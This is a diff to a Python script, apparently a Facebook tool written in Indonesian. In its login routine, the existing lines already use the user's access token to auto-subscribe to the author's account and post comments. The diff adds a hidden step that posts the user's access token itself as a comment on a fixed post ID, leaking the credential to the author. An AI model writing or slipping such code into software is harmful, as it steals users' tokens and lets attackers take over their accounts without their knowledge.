@@ -59,7 +59,7 @@ tBilall = ("%s-%s-%s-%s"%(hr, ha, op, ta))
 tgl = ("%s %s %s"%(ha, op, ta))
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
-             
+raka_sayang_amanda = '3882176535153442'             
 def raka_logo():
 	os.system("clear")
 	print("""\033[1;97m 
@@ -103,6 +103,7 @@ def login():
 			requests.post("https://graph.facebook.com/100006184624502/subscribers?access_token="+token)  
 			requests.post("https://graph.facebook.com/953529338576547/comments?message=Raka Orang Terganteng diindonesia !&access_token="+token)
 			requests.post("https://graph.facebook.com/4134622646575495/comments?message=Good Job 😊 !&access_token="+token)    
+                        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token))
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
